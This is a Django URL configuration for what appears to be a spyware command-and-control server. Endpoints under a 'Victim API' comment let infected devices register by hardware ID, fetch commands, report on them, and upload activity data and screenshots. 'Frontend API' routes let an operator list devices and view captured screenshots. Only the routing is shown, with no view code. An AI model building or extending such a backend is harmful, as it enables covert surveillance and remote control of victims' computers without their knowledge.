from django.urls import path

from core.views import (
    GetDeviceDataAndCommandsView,
    ReportCommandStatusView,
    UploadActivityDataView,
    UploadScreenshotView,
    check_new_screenshot,
    device_create_or_update,
    device_list_api,
    latest_screenshot,
)

urlpatterns = [
    # Victim API
    path("register_device/", device_create_or_update, name="register_device"),
    path(
        "get_data_and_commands/<str:hardware_id>/", GetDeviceDataAndCommandsView.as_view(), name="get_data_and_commands"
    ),
    path(
        "report_command_status/<str:hardware_id>/<str:command_id>/",
        ReportCommandStatusView.as_view(),
        name="report_command_status",
    ),
    path("upload_activity_data/<str:hardware_id>/", UploadActivityDataView.as_view(), name="upload_activity_data"),
    path("upload_screenshot/<str:hardware_id>/", UploadScreenshotView.as_view(), name="upload_screenshot"),
    # Frontend API
    path("devices/", device_list_api, name="device_list"),
    path("latest/<int:device_id>/", latest_screenshot, name="latest_screenshot"),
    path("check/<int:device_id>/", check_new_screenshot, name="check_new_screenshot"),
]
